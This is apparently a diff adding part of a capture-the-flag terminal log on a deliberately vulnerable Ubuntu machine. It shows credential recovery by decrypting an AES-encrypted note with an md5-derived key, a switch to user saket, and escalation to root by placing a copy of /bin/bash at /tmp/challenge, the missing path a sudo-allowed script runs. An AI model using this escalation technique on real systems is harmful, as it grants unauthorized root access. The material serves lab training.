@@ -311,6 +311,129 @@ User www-data may run the following commands on ubuntu:
     (root) NOPASSWD: /home/saket/enc
 
 
+www-data@ubuntu:/opt/backup/server_database$ cat bac
+cat backup_pass 
+your password for backup_database file enc is 
+
+"backup_password"
+
+
+Enjoy!
+
+www-data@ubuntu:/home/saket$ sudo ./enc
+sudo ./enc 
+enter password: backup_password
+backup_password
+good
+
+www-data@ubuntu:/home/saket$ ls -lah
+ls -lah
+total 44K
+drwxr-xr-x 2 root root 4.0K Mar 28 20:12 .
+drwxr-xr-x 4 root root 4.0K Aug 29  2019 ..
+-rw------- 1 root root   20 Aug 31  2019 .bash_history
+-rwxr-x--x 1 root root  14K Aug 30  2019 enc
+-rw-r--r-- 1 root root  237 Mar 28 20:12 enc.txt
+-rw-r--r-- 1 root root  123 Mar 28 20:12 key.txt
+-rw-r--r-- 1 root root   18 Aug 29  2019 password.txt
+-rw-r--r-- 1 root root   33 Aug 31  2019 user.txt
+
+www-data@ubuntu:/home/saket$ cat enc.txt
+cat enc.txt
+nzE+iKr82Kh8BOQg0k/LViTZJup+9DReAsXd/PCtFZP5FHM7WtJ9Nz1NmqMi9G0i7rGIvhK2jRcGnFyWDT9MLoJvY1gZKI2xsUuS3nJ/n3T1Pe//4kKId+B3wfDW/TgqX6Hg/kUj8JO08wGe9JxtOEJ6XJA3cO/cSna9v3YVf/ssHTbXkb+bFgY7WLdHJyvF6lD/wfpY2ZnA1787ajtm+/aWWVMxDOwKuqIT1ZZ0Nw4=
+
+www-data@ubuntu:/home/saket$ cat key.txt
+cat key.txt
+I know you are the fan of ippsec.
+
+So convert string "ippsec" into md5 hash and use it to gain yourself in your real form.
+
+www-data@ubuntu:/home/saket$ echo -n ippsec | md5sum
+echo -n ippsec | md5sum
+366a74cb3c959de17d61db30591c39d1  -
+
+www-data@ubuntu:/home/saket$ echo -n 366a74cb3c959de17d61db30591c39d1 | od -A n -t x1
+echo -n 366a74cb3c959de17d61db30591c39d1 | od -A n -t x1
+ 33 36 36 61 37 34 63 62 33 63 39 35 39 64 65 31
+ 37 64 36 31 64 62 33 30 35 39 31 63 33 39 64 31
+
+
+www-data@ubuntu:/home/saket$ echo "nzE+iKr82Kh8BOQg0k/LViTZJup+9DReAsXd/PCtFZP5FHM7WtJ9Nz1NmqMi9G0i7rGIvhK2jRcGnFyWDT9MLoJvY1gZKI2xsUuS3nJ/n3T1Pe//4kKId+B3wfDW/TgqX6Hg/kUj8JO08wGe9JxtOEJ6XJA3cO/cSna9v3YVf/ssHTbXkb+bFgY7WLdHJyvF6lD/wfpY2ZnA1787ajtm+/aWWVMxDOwKuqIT1ZZ0Nw4=" | openssl enc -aes-256-ecb -d -a -K 3336366137346362336339353964653137643631646233303539316333396431 | base64 | base64 -d
+Dont worry saket one day we will reach to
+our destination very soon. And if you forget 
+your username then use your old password
+==> "tribute_to_ippsec"
+
+Victor,
+
+www-data@ubuntu:/home/saket$ su saket
+su saket
+Password: tribute_to_ippsec
+
+saket@ubuntu:~$ whoami
+whoami
+saket
+saket@ubuntu:~$ id
+id
+uid=1001(saket) gid=1001(saket) groups=1001(saket)
+saket@ubuntu:~$ sudo -l
+sudo -l
+Matching Defaults entries for saket on ubuntu:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User saket may run the following commands on ubuntu:
+    (root) NOPASSWD: /home/victor/undefeated_victor
+
+saket@ubuntu:~$ sudo /home/victor/undefeated_victor
+sudo /home/victor/undefeated_victor
+if you can defeat me then challenge me in front of you
+/home/victor/undefeated_victor: 2: /home/victor/undefeated_victor: /tmp/challenge: not found
+
+saket@ubuntu:~$ cd /tmp
+cd /tmp/
+saket@ubuntu:/tmp$ cp /bin/bash /tmp/challenge
+cp /bin/bash /tmp/challenge
+
+saket@ubuntu:/tmp$ sudo /home/victor/undefeated_victor 
+sudo /home/victor/undefeated_victor
+if you can defeat me then challenge me in front of you
+root@ubuntu:/tmp# id
+id
+uid=0(root) gid=0(root) groups=0(root)
+
+root@ubuntu:/# cd root 
+cd root
+root@ubuntu:/root# ls -lah
+ls -lah
+total 92K
+drwx------  5 root root 4.0K Aug 31  2019 .
+drwxr-xr-x 24 root root 4.0K Mar 28 19:44 ..
+-rw-------  1 root root 8.4K Sep  1  2019 .bash_history
+-rw-r--r--  1 root root 3.1K Oct 22  2015 .bashrc
+drwx------  3 root root 4.0K Aug 30  2019 .cache
+-rwxr-xr-x  1 root root  14K Aug 30  2019 enc
+-rw-r--r--  1 root root  305 Aug 30  2019 enc.cpp
+-rw-r--r--  1 root root  237 Aug 30  2019 enc.txt
+-rw-r--r--  1 root root  123 Aug 30  2019 key.txt
+-rw-------  1 root root  137 Aug 30  2019 .mysql_history
+drwxr-xr-x  2 root root 4.0K Aug 29  2019 .nano
+-rw-r--r--  1 root root  148 Aug 17  2015 .profile
+-rw-r--r--  1 root root   33 Aug 30  2019 root.txt
+-rw-r--r--  1 root root   66 Aug 31  2019 .selected_editor
+-rw-r--r--  1 root root  805 Aug 30  2019 sql.py
+-rwxr-xr-x  1 root root  442 Aug 31  2019 t.sh
+drwxr-xr-x 10 root root 4.0K Aug 30  2019 wfuzz
+-rw-r--r--  1 root root  170 Aug 29  2019 wordpress.sql
+root@ubuntu:/root# cat root.txt
+cat root.txt
+b2b17036da1de94cfb024540a8e7075a
+
+
+
+
+
+
 
 
 
